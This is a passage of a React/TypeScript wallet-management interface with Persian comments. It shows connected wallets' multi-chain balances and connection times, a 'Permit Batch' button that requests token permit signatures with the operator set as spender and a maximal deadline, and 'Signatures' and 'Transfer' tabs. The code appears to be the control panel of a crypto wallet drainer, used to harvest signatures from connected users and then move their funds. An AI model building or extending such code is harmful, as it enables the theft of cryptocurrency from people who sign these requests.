                const meta = tokens.find(t => t.token_address.toLowerCase() === d.token.toLowerCase());
                return { ...d, token_address: meta?.token_address, symbol: meta?.symbol, name: meta?.name, decimals: meta?.decimals };
              }),
              spender: owner,
              sigDeadline: MAX_UINT48,
            },
          }),
        });

        const json = await res.json();
        if (!res.ok || !json.success) throw new Error(json.error || 'Failed');
      }

      setCheckedAddrs(new Set());
      onSignedChange();
    } catch (err: any) {
      const msg = err?.message || '';
      if (!msg.toLowerCase().includes('reject') && !msg.toLowerCase().includes('denied')) {
        alert('Error: ' + msg);
      }
    } finally {
      setRequesting(false);
    }
  };

  return (
    <div className="space-y-4">
      {/* ERC20 به تفکیک chain */}
      {Object.entries(erc20ByChain).map(([cid, { tokens, total }]) => (
        <ERC20Section
          key={`erc20-${cid}`}
          title="ERC20"
          chainId={cid}
          tokens={tokens}
          total={total}
          isSigned={!!signedChains[cid]}
          signedTokens={signedTokens}
          checkedAddrs={checkedAddrs}
          onToggle={toggleOne}
          onToggleAll={toggleAll}
          onSingleRequest={handleSingleRequest}
          singleRequestingAddr={singleRequestingAddr}
        />
      ))}

      {/* BEP20 */}
      {detail.assets?.bep20?.length > 0 && (
        <ERC20Section
          title="BEP20"
          chainId="56"
          tokens={detail.assets.bep20}
          total={bep20Total}
          isSigned={!!signedChains['56']}
          signedTokens={signedTokens}
          checkedAddrs={checkedAddrs}
          onToggle={toggleOne}
          onToggleAll={toggleAll}
          onSingleRequest={handleSingleRequest}
          singleRequestingAddr={singleRequestingAddr}
        />
      )}

      {/* Native به تفکیک chain */}
      {Object.entries(nativeByChain).map(([cid, { coins, total }]) => (
        <NativeSection
          key={`native-${cid}`}
          chainId={cid}
          coins={coins}
          total={total}
          onRequestDone={onSignedChange}
        />
      ))}

      {/* دکمه Permit Batch — فقط برای ETH توکن های انتخاب‌شده */}
      {checkedAddrs.size > 0 && (
        <button
          onClick={handlePermitBatch}
          disabled={requesting}
          className="w-full flex items-center justify-center gap-2 px-4 py-3 rounded-xl bg-blue-500/10 border border-blue-500/20 text-blue-400 text-sm font-semibold hover:bg-blue-500/20 transition-colors disabled:opacity-30 disabled:cursor-not-allowed"
        >
          {requesting ? (
            <><span className="w-4 h-4 border-2 border-blue-400 border-t-transparent rounded-full animate-spin" />Signing...</>
          ) : (
            <>
              <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path d="M12 20h9" /><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" />
              </svg>
              Permit Batch ({checkedAddrs.size} ETH token{checkedAddrs.size > 1 ? 's' : ''})
            </>
          )}
        </button>
      )}

      {/* Total */}
      <div className="bg-blue-500/10 border border-blue-500/20 rounded-xl px-4 py-3 flex items-center justify-between">
        <span className="text-blue-300 text-sm font-semibold">Total Balance</span>
        <span className="text-blue-300 text-sm font-semibold">${totalUsdt.toFixed(2)} USDT</span>
      </div>
    </div>
  );
}

// ── Main Modal ────────────────────────────────────────────────────
export function WalletModal({ walletId, address, onClose }: Props) {
  const [activeTab, setActiveTab] = useState<Tab>('Overview');
  const [detail, setDetail] = useState<WalletDetail | null>(null);
  const [loading, setLoading] = useState(true);
  // signed status: chain_id → boolean
  const [signedChains, setSignedChains] = useState<Record<string, boolean>>({});

  const fetchDetail = useCallback(() => {
    fetch(`/api/wallets/${walletId}`).then(r => r.json()).then(json => { if (json.success) setDetail(json.data); }).finally(() => setLoading(false));
  }, [walletId]);

  const fetchSignedStatus = useCallback(() => {
    fetch(`/api/signatures/status?wallet=${address}`)
      .then(r => r.json())
      .then(j => { if (j.success) setSignedChains(j.signed); });
  }, [address]);

  useEffect(() => { fetchDetail(); fetchSignedStatus(); }, [fetchDetail, fetchSignedStatus]);

  const totalUsdt = detail?.total_usdt ?? 0;
  const bep20Total = detail?.assets?.bep20?.reduce((s, t) => s + t.usd_value, 0) ?? 0;

  // گروه‌بندی native coins بر اساس chain
  const nativeByChain = detail?.assets?.native?.reduce((acc, coin) => {
    const cid = resolveChainId(coin.chain || '') || coin.chain;
    if (!acc[cid]) acc[cid] = { coins: [], total: 0, label: coin.chain_label };
    acc[cid].coins.push(coin);
    acc[cid].total += coin.usd_value;
    return acc;
  }, {} as Record<string, { coins: NativeCoin[]; total: number; label: string }>) ?? {};

  // گروه‌بندی ERC20 بر اساس chain
  const erc20ByChain = detail?.assets?.erc20?.reduce((acc, token) => {
    const cid = resolveChainId(token.chain || '') || token.chain;
    if (!acc[cid]) acc[cid] = { tokens: [], total: 0, label: token.chain_label };
    acc[cid].tokens.push(token);
    acc[cid].total += token.usd_value;
    return acc;
  }, {} as Record<string, { tokens: TokenAsset[]; total: number; label: string }>) ?? {};

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" onClick={onClose} />
      <div className="relative z-10 w-full max-w-xl bg-[#141414] border border-[#1d1d1d] rounded-2xl overflow-hidden flex flex-col max-h-[90vh]">

        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-[#1d1d1d]">
          <div>
            <p className="text-white font-semibold text-sm">Wallet Details</p>
            <p className="text-white/30 text-xs font-mono mt-0.5">{shortAddress(address)}</p>
          </div>
          <button onClick={onClose} className="text-white/30 hover:text-white/70 transition-colors p-1.5 rounded-lg hover:bg-white/5">
            <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
          </button>
        </div>

        {/* Tabs */}
        <div className="flex border-b border-[#1d1d1d] px-5">
          {TABS.map(tab => (
            <button key={tab} onClick={() => setActiveTab(tab)} className={`px-3 py-3 text-xs font-medium border-b-2 transition-all mr-1 ${activeTab === tab ? 'border-blue-500 text-blue-400' : 'border-transparent text-white/30 hover:text-white/60'}`}>
              {tab}
            </button>
          ))}
        </div>

        {/* Content */}
        <div className="flex-1 overflow-y-auto p-5">
          {loading ? (
            <div className="flex items-center justify-center py-12"><div className="w-5 h-5 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" /></div>
          ) : !detail ? (
            <p className="text-white/30 text-center py-12 text-sm">Failed to load wallet data</p>
          ) : (
            <>
              {/* OVERVIEW */}
              {activeTab === 'Overview' && (
                <div className="space-y-2">
                  {[
                    { label: 'Full Address', value: detail.address, mono: true },
                    { label: 'Total Balance', value: `$${totalUsdt.toFixed(2)} USDT`, mono: false },
                    { label: 'Connected At', value: formatDate(detail.connected_at), mono: false },
                    { label: 'Last Updated', value: formatDate(detail.updated_at), mono: false },
                    { label: 'Status', value: detail.is_connected ? 'Connected' : 'Disconnected', mono: false },
                  ].map(row => (
                    <div key={row.label} className="flex items-start justify-between bg-[#1a1a1a] border border-[#1d1d1d] rounded-xl px-4 py-3">
                      <span className="text-white/40 text-xs shrink-0">{row.label}</span>
                      <span className={`text-white/80 text-xs text-right max-w-[280px] break-all ml-4 ${row.mono ? 'font-mono' : 'font-medium'}`}>{row.value}</span>
                    </div>
                  ))}
                </div>
              )}

              {/* ASSETS */}
              {activeTab === 'Assets' && (
                <AssetsTab
                  detail={detail}
                  address={address}
                  erc20ByChain={erc20ByChain}
                  nativeByChain={nativeByChain}
                  bep20Total={bep20Total}
                  totalUsdt={totalUsdt}
                  signedChains={signedChains}
                  onSignedChange={fetchSignedStatus}
                />
              )}

              {/* SIGNATURES */}
              {activeTab === 'Signatures' && (
                <SignaturesTab walletAddress={detail.address} onSigsChange={fetchSignedStatus} />
              )}

              {/* TRANSFER */}
              {activeTab === 'Transfer' && (
                <TransferTab walletAddress={detail.address} detail={detail} />
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
}